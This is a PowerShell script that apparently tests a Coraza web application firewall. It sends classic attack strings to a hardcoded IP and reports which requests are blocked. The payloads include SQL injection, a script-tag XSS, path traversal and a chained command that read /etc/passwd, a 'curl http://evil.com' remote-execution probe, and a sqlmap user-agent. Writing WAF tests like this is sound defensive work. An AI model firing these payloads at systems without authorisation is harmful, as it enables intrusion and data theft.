param(
    [string]$BaseUrl = "http://110.238.69.130"
)

Write-Host ""
Write-Host "========================================="
Write-Host "WAF Security Test - Coraza + Gateway API"
Write-Host "Target: $BaseUrl"
Write-Host "========================================="
Write-Host ""

function Test-Request {
    param (
        [string]$Name,
        [string]$Url,
        [hashtable]$Headers = @{}
    )

    try {
        $response = Invoke-WebRequest -Uri $Url -Method GET -Headers $Headers -TimeoutSec 10 -ErrorAction Stop
        $status = $response.StatusCode
    }
    catch {
        if ($_.Exception.Response -ne $null) {
            $status = $_.Exception.Response.StatusCode.value__
        } else {
            $status = "ERROR"
        }
    }

    if ($status -eq 403) {
        Write-Host "[BLOCKED] $Name -> HTTP $status" -ForegroundColor Green
    }
    elseif ($status -eq 200) {
        Write-Host "[ALLOWED] $Name -> HTTP $status" -ForegroundColor Yellow
    }
    else {
        Write-Host "[UNKNOWN] $Name -> HTTP $status" -ForegroundColor Cyan
    }
}

# ===============================
# TESTS
# ===============================

Test-Request "Normal Request" "$BaseUrl/"

Test-Request "SQL Injection" "$BaseUrl/?id=' OR 1=1--"

Test-Request "XSS Attack" "$BaseUrl/?q=<script>alert(1)</script>"

Test-Request "Path Traversal" "$BaseUrl/?file=../../etc/passwd"

Test-Request "Command Injection" "$BaseUrl/?cmd=ls;cat /etc/passwd"

Test-Request "RCE Attempt" "$BaseUrl/?exec=curl http://evil.com"

# Scanner User-Agent
Test-Request "Scanner User-Agent" "$BaseUrl/" @{ "User-Agent" = "sqlmap" }

Write-Host ""
Write-Host "========================================="
Write-Host "Test Completed"
Write-Host "========================================="